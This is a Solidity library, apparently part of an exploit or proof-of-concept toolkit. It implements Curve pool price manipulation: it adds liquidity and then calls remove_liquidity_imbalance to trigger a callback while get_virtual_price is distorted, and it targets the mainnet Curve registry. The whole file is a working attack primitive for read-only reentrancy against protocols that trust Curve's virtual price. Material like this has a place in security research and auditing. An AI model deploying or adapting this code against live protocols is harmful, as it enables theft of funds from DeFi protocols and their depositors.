pragma solidity ^0.8.0;

import "../../tokens/Tokens.sol";

/**
 * Vulnerabilities stemming from Curve pool get_virtual_price manipulation can only occur
 * in pools where the underlying asset is ETH, or the underlying asset is a token which
 * makes a callback to the receiver on transfers
 */
library CurvePriceManipulation {
    struct Context {
        ICurvePoolRegistry poolRegistry;
    }

    /**
     * @dev Manipulates the price in a Curve pool by adding and removing liquidity.
     * @param token0 Address of the first token in the pool.
     * @param token1 Address of the second token in the pool.
     * @param amount0 The amount of token0 to add to the pool.
     * @param amount1 The amount of token1 to add to the pool.
     */
    function manipulatePoolPrice(IERC20 token0, IERC20 token1, uint256 amount0, uint256 amount1) internal {
        Context memory context = context();

        ICurvePool curvePool = ICurvePool(context.poolRegistry.find_pool_for_coins(address(token0), address(token1)));

        uint256[2] memory amounts;
        amounts[0] = amount0;
        amounts[1] = amount1;

        if (token0 != EthereumTokens.ETH) {
            token0.approve(address(curvePool), 0);
            token0.approve(address(curvePool), type(uint256).max);
        }
        token1.approve(address(curvePool), 0);
        token1.approve(address(curvePool), type(uint256).max);

        curvePool.add_liquidity{value: token0 == EthereumTokens.ETH ? amount0 : 0}(amounts, 0);

        IERC20 lp_token = IERC20(curvePool.lp_token());

        amounts[0] = lp_token.balanceOf(address(this)) * curvePool.balances(0) / lp_token.totalSupply();
        amounts[1] = lp_token.balanceOf(address(this)) * curvePool.balances(1) / lp_token.totalSupply();

        // Trigger callback
        curvePool.remove_liquidity_imbalance(amounts, type(uint256).max);
    }

    /**
     * @dev Returns the context information for the curve pool registry.
     * @return Context The context information.
     */
    function context() internal view returns (Context memory) {
        ICurvePoolRegistry poolRegistry;
        if (block.chainid == 1) {
            // Ethereum mainnet
            poolRegistry = ICurvePoolRegistry(0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5);
        } else {
            revert("CurvePriceManipulation: Chain not supported");
        }

        return Context(poolRegistry);
    }
}

interface ICurvePoolRegistry {
    function find_pool_for_coins(address token0, address token1) external view returns (address);
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity(uint256 amount, uint256[2] memory minAmounts) external returns (uint256);
    function remove_liquidity_imbalance(uint256[2] memory amounts, uint256 maxBurnAmount) external returns (uint256);
    function balances(uint256 i) external view returns (uint256);
    function lp_token() external view returns (address);
    function get_virtual_price() external view returns (uint256);
}
